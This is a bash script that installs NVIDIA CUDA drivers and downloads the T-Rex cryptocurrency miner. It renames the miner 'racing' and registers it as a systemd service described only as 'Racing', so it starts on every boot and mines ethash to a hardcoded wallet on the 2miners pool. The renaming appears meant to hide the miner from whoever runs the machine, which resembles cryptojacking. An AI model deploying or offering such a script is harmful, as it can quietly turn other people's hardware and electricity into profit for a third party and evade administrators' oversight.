#!/bin/bash
cd /home
apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
dpkg -i cuda-keyring_1.0-1_all.deb
apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
apt-get update
apt-get -y install cuda-drivers-510
apt-get install libcurl3 -y
wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
systemctl daemon-reload
systemctl enable racing.service
./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x -w cardano &
